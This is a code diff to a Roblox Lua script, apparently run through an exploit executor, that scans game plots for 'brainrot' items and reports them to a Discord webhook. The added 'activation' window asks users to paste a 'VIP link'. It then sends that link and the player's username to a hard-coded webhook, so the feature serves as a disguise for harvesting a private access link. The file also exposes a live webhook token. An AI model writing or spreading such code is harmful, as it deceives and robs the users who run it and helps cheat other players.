@@ -1,11 +1,20 @@
 local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
 
 -- =============================
 -- Конфиг
 -- =============================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- Вставь сюда Discord/Webhook URL или оставь пустым, чтобы не отправлять
+
+-- =============================
+-- Глобальные переменные
+-- =============================
+local isActivated = false
+local brainrotCount = 0
+local activationGUI = nil
 
 -- Канонические названия брейнротов (с заглавными буквами для вывода)
 local CANONICAL_BRAINROT_NAMES = {
@@ -199,6 +208,145 @@ local function isAllowedByCategory(name)
 end
 
 -- =============================
+-- GUI Активация
+-- =============================
+local function createActivationGUI()
+	local player = Players.LocalPlayer
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "BrainrotScannerActivation"
+	gui.ResetOnSpawn = false
+	gui.Parent = player:WaitForChild("PlayerGui")
+	
+	-- Основной фрейм
+	local mainFrame = Instance.new("Frame")
+	mainFrame.Name = "MainFrame"
+	mainFrame.Size = UDim2.new(0, 400, 0, 300)
+	mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+	mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+	mainFrame.BorderSizePixel = 0
+	mainFrame.Parent = gui
+	
+	-- Скругление
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 10)
+	corner.Parent = mainFrame
+	
+	-- Заголовок
+	local title = Instance.new("TextLabel")
+	title.Name = "Title"
+	title.Size = UDim2.new(1, -20, 0, 40)
+	title.Position = UDim2.new(0, 10, 0, 10)
+	title.BackgroundTransparency = 1
+	title.Text = "Paste your VIP link to activate the script"
+	title.TextColor3 = Color3.new(1, 1, 1)
+	title.TextScaled = true
+	title.Font = Enum.Font.GothamBold
+	title.Parent = mainFrame
+	
+	-- Поле ввода
+	local textBox = Instance.new("TextBox")
+	textBox.Name = "VipLinkInput"
+	textBox.Size = UDim2.new(1, -20, 0, 40)
+	textBox.Position = UDim2.new(0, 10, 0, 60)
+	textBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+	textBox.BorderSizePixel = 0
+	textBox.Text = ""
+	textBox.PlaceholderText = "https://discord.gg/your-vip-link"
+	textBox.PlaceholderColor3 = Color3.new(0.5, 0.5, 0.5)
+	textBox.TextColor3 = Color3.new(1, 1, 1)
+	textBox.TextScaled = true
+	textBox.Font = Enum.Font.Gotham
+	textBox.Parent = mainFrame
+	
+	local textBoxCorner = Instance.new("UICorner")
+	textBoxCorner.CornerRadius = UDim.new(0, 5)
+	textBoxCorner.Parent = textBox
+	
+	-- Кнопка активации
+	local activateButton = Instance.new("TextButton")
+	activateButton.Name = "ActivateButton"
+	activateButton.Size = UDim2.new(1, -20, 0, 50)
+	activateButton.Position = UDim2.new(0, 10, 0, 120)
+	activateButton.BackgroundColor3 = Color3.new(0.2, 0.6, 1)
+	activateButton.BorderSizePixel = 0
+	activateButton.Text = "ACTIVATE"
+	activateButton.TextColor3 = Color3.new(1, 1, 1)
+	activateButton.TextScaled = true
+	activateButton.Font = Enum.Font.GothamBold
+	activateButton.Parent = mainFrame
+	
+	local buttonCorner = Instance.new("UICorner")
+	buttonCorner.CornerRadius = UDim.new(0, 5)
+	buttonCorner.Parent = activateButton
+	
+	-- Статус
+	local statusLabel = Instance.new("TextLabel")
+	statusLabel.Name = "Status"
+	statusLabel.Size = UDim2.new(1, -20, 0, 30)
+	statusLabel.Position = UDim2.new(0, 10, 0, 180)
+	statusLabel.BackgroundTransparency = 1
+	statusLabel.Text = ""
+	statusLabel.TextColor3 = Color3.new(1, 1, 0)
+	statusLabel.TextScaled = true
+	statusLabel.Font = Enum.Font.Gotham
+	statusLabel.Parent = mainFrame
+	
+	-- Счетчик брейнротов
+	local counterLabel = Instance.new("TextLabel")
+	counterLabel.Name = "Counter"
+	counterLabel.Size = UDim2.new(1, -20, 0, 30)
+	counterLabel.Position = UDim2.new(0, 10, 0, 220)
+	counterLabel.BackgroundTransparency = 1
+	counterLabel.Text = "Brainrots found: 0"
+	counterLabel.TextColor3 = Color3.new(0, 1, 0)
+	counterLabel.TextScaled = true
+	counterLabel.Font = Enum.Font.GothamBold
+	counterLabel.Parent = mainFrame
+	
+	-- Обработчики
+	activateButton.MouseButton1Click:Connect(function()
+		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1") -- trim
+		if vipLink == "" or not string.find(vipLink, "discord%.gg/") then
+			statusLabel.Text = "Invalid VIP link! Please enter a valid Discord invite."
+			statusLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
+			return
+		end
+		
+		statusLabel.Text = "Activating..."
+		statusLabel.TextColor3 = Color3.new(1, 1, 0)
+		
+		-- Отправляем VIP ссылку в Discord
+		sendWebhook({ 
+			content = string.format("VIP Link activated: %s\nUser: %s", vipLink, player.Name)
+		})
+		
+		-- Активируем скрипт
+		isActivated = true
+		statusLabel.Text = "Script activated successfully!"
+		statusLabel.TextColor3 = Color3.new(0, 1, 0)
+		
+		-- Запускаем сканирование
+		task.wait(1)
+		startBrainrotScanner()
+		
+		-- Убираем GUI через 2 секунды
+		task.wait(2)
+		gui:Destroy()
+		activationGUI = nil
+	end)
+	
+	-- Enter для активации
+	textBox.FocusLost:Connect(function(enterPressed)
+		if enterPressed then
+			activateButton.MouseButton1Click:Fire()
+		end
+	end)
+	
+	activationGUI = gui
+	return gui
+end
+
+-- =============================
 -- Отправка вебхука (устойчиво)
 -- =============================
 local function tryExploitRequest(json)
@@ -342,8 +490,18 @@ local function buildPlotSection(plot)
 	return table.concat(lines, "\n")
 end
 
+local function updateCounter()
+	if activationGUI and activationGUI.Parent then
+		local counter = activationGUI:FindFirstChild("MainFrame"):FindFirstChild("Counter")
+		if counter then
+			counter.Text = string.format("Brainrots found: %d", brainrotCount)
+		end
+	end
+end
+
 local function postCombinedAllPlots()
 	local sections = {}
+	local totalFound = 0
 	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
 		local section = buildPlotSection(plot)
 		if section then
@@ -351,8 +509,15 @@ local function postCombinedAllPlots()
 			-- Одновременно печатаем в консоль
 			print(section)
 			print("")
+			-- Считаем брейнроты в этом плоте
+			local entries = collectBrainrotsInPlot(plot)
+			totalFound = totalFound + #entries
 		end
 	end
+	
+	brainrotCount = totalFound
+	updateCounter()
+	
 	if #sections > 0 then
 		local body = table.concat(sections, "\n\n")
 		postDiscordSimple(body)
@@ -420,9 +585,17 @@ local function watchPlots()
 end
 
 -- =============================
+-- Основной сканер
+-- =============================
+local function startBrainrotScanner()
+	print("[BrainrotScanner] Стартую сканирование брейнротов в Workspace.Plots ...")
+	scanAllPlotsOnce()
+	watchPlots()
+	print("[BrainrotScanner] Мониторинг активирован. Объединенный отчет будет отправляться в один вебхук.")
+end
+
+-- =============================
 -- Старт
 -- =============================
-print("[BrainrotScanner] Стартую сканирование брейнротов в Workspace.Plots ...")
-scanAllPlotsOnce()
-watchPlots()
-print("[BrainrotScanner] Мониторинг активирован. Объединенный отчет будет отправляться в один вебхук.")
+print("[BrainrotScanner] Создаю GUI активации...")
+createActivationGUI()
